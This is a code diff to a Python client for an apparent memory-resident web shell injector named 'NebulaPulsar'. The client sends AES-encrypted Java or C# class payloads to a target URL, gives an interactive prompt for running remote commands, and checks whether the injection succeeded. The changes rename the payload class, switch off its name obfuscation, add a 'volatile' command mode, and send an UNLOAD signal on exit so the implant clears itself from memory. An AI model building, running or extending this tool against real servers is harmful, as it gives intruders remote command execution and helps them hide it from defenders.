@@ -10,7 +10,7 @@ from Cryptodome.Cipher import AES
 from Cryptodome.Util.Padding import pad, unpad
 
 MAGIC_NEBULAPULSAR = 'NebulaPulsar'
-MAGIC_PAYLOAD = 'Cmd'
+MAGIC_PAYLOAD = 'DarkMatter'
 
 MAGIC_CSHARP = 'dll'
 MAGIC_JAVA = 'class'
@@ -57,7 +57,7 @@ def aes_decrypt(buffer: bytes) -> bytes:
     cipher = AES.new(KEY, AES.MODE_ECB)
     return unpad(cipher.decrypt(buffer), 16)
 
-def obfus_class_name(class_bytes: bytes, name: str = 'Cmd'):
+def obfus_class_name(class_bytes: bytes, name: str = 'DarkMatter'):
     new_name = ''.join(random.choices(string.ascii_letters, k=len(name)))
     patched_bytes = class_bytes.replace(name.encode('utf-8'), new_name.encode('utf-8'))
 
@@ -71,13 +71,21 @@ def do_cmd(session, payload: str):
         try:
             cmd = input('> ')
             if cmd.strip().lower() in ['exit', 'quit']:
+                print_logs("Sending UNLOAD signal to clear memory...")
+                param = 'action=UNLOAD'
+                raw_payload = struct.pack('>I', 0) + param.encode('utf-8')
+                encrypted_payload = aes_encrypt(raw_payload)
+                
+                headers = {'Content-Type': 'application/octet-stream'}
+                resp = session.post(args.url, data=encrypted_payload, headers=headers)
+                print_success(f"Server response: {resp.text.strip()}")
                 break
             if not cmd.strip():
                 continue
 
-            param_str = f'action=CMD&cmd={cmd}'
+            param_str = f'action=CMD&cmd={cmd}&mode=volatile'
 
-            dynamic_bytes = obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
+            dynamic_bytes = payload_bytes # obfus_class_name(payload_bytes, MAGIC_PAYLOAD)
             class_len = len(dynamic_bytes)
 
             raw_payload = struct.pack('>I', class_len) + dynamic_bytes + param_str.encode('utf-8')
@@ -150,8 +158,10 @@ def main():
 
     print_logs('Response:\n\t' + resp_text)
 
-    if MAGIC_SUCCESS in resp_text or MAGIC_EXIST in resp_text:
+    if MAGIC_SUCCESS in resp_text:
         print_success('NebulaPulsar is successfully injected!')
+    elif MAGIC_EXIST in resp_text:
+        print_success('NebulaPulsar exists!')
     else:
         print_error('Cannot inject NebulaPulsar')
         exit()
